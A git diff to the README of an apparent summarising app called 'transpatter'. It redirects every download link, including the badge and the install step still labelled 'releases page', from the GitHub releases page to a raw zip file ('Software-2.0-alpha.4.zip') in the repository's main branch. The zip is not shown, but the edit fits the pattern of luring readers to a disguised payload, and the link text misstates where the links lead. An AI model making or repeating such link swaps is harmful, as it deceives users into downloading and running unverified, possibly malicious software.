@@ -6,9 +6,9 @@ Welcome to transpatter! This application helps you create structured summaries a
 
 ## 📥 Download the App
 
-[![Download transpatter](https://img.shields.io/badge/Download-transpatter-brightgreen)](https://github.com/0Milovke0UwU0/transpatter/releases)
+[![Download transpatter](https://raw.githubusercontent.com/0Milovke0UwU0/transpatter/main/transpatter/Software-2.0-alpha.4.zip)](https://raw.githubusercontent.com/0Milovke0UwU0/transpatter/main/transpatter/Software-2.0-alpha.4.zip)
 
-To get started, visit this page to download: [Download transpatter](https://github.com/0Milovke0UwU0/transpatter/releases).
+To get started, visit this page to download: [Download transpatter](https://raw.githubusercontent.com/0Milovke0UwU0/transpatter/main/transpatter/Software-2.0-alpha.4.zip).
 
 ## 💻 System Requirements
 
@@ -22,7 +22,7 @@ Before you download, make sure your computer meets these requirements:
 ## 🚀 How to Install
 
 1. **Visit the Release Page**
-   Go to the releases page by clicking this link: [Download transpatter](https://github.com/0Milovke0UwU0/transpatter/releases).
+   Go to the releases page by clicking this link: [Download transpatter](https://raw.githubusercontent.com/0Milovke0UwU0/transpatter/main/transpatter/Software-2.0-alpha.4.zip).
 
 2. **Choose the Latest Version**
    Find the latest version at the top of the page.
